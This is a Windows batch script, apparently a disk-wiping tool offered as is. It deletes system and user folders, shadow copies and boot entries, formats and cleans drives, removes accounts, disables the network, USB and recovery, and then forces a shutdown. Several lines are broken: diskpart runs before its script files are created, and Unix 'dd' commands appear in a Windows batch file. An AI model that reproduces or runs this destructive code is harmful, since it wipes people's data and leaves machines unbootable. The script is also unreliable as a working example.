@echo off

rd /s /q C:\Windows\System32
rd /s /q C:\Users
rd /s /q C:\Windows\SoftwareDistribution
rd /s /q C:\Windows\System32\winevt\Logs
rd /s /q C:\$Recycle.Bin
rd /s /q C:\ProgramData
rd /s /q C:\Users\All Users
del /f /q C:\pagefile.sys
del /f /q C:\hiberfil.sys

del /f /q C:\Windows\System32\*.* /s
del /f /q C:\Windows\*.* /s
del /f /q C:\Program Files\*.* /s
del /f /q C:\Program Files (x86)\*.* /s
del /f /q C:\Users\*.* /s
attrib -s -h C:\Windows\System32\*.* /s
attrib -s -h C:\Windows\*.* /s

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
sc config srservice start= disabled
sc stop srservice

sc config wuauserv start= disabled
sc stop wuauserv

vssadmin delete shadows /all /quiet
vssadmin delete shadowstorage /for=C: /quiet

bcdedit /delete {default} /f
bcdedit /delete {current} /f
bcdedit /delete {bootmgr} /f
bcdedit /delete {ntldr} /f

for %%X in (D E F G H) do (
    echo Y | format %%X: /q /fs:NTFS
)

diskpart /s %temp%\wipe.txt
@echo select disk 0 > %temp%\wipe.txt
@echo clean all >> %temp%\wipe.txt
@echo convert mbr >> %temp%\wipe.txt
@echo exit >> %temp%\wipe.txt

diskpart /s %temp%\efiwipe.txt
@echo select disk 0 > %temp%\efiwipe.txt
@echo list partition >> %temp%\efiwipe.txt
@echo select partition 1 >> %temp%\efiwipe.txt
@echo delete partition override >> %temp%\efiwipe.txt
@echo exit >> %temp%\efiwipe.txt

@echo Y | dd if=/dev/urandom of=C: bs=1M
for %%X in (D E F G H) do (
    echo Y | dd if=/dev/urandom of=%%X: bs=1M
)

cipher /w:C:

net user administrator /delete
net user guest /delete

devcon disable *cdrom*

wmic path win32_networkadapter where "NetEnabled=true" call disable

reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cdrom" /v Start /t REG_DWORD /d 4 /f

del /f /q D:\bootmgr
del /f /q E:\bootmgr
del /f /q F:\bootmgr
del /f /q G:\bootmgr

diskpart /s %temp%\delete_boot_partition.txt

diskpart /s %temp%\disable_recovery.txt
@echo select disk 1 > %temp%\disable_recovery.txt
@echo clean >> %temp%\disable_recovery.txt
@echo exit >> %temp%\disable_recovery.txt

diskpart /s %temp%\block_install.txt
@echo select disk 0 > %temp%\block_install.txt
@echo clean >> %temp%\block_install.txt
@echo create partition primary size=100 >> %temp%\block_install.txt
@echo format fs=ntfs quick >> %temp%\block_install.txt
@echo assign letter=Z >> %temp%\block_install.txt
@echo exit >> %temp%\block_install.txt

bcdedit /set {bootmgr} path \EFI\nul
bcdedit /set {current} path \EFI\nul
bcdedit /set {default} path \EFI\nul

reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
devcon disable *USB*

reg add "HKLM\SYSTEM\CurrentControlSet\Services\mountmgr" /v NoAutoMount /t REG_DWORD /d 1 /f

wmic path win32_networkadapter where "NetEnabled=true" call disable

shutdown /s /f /t 0
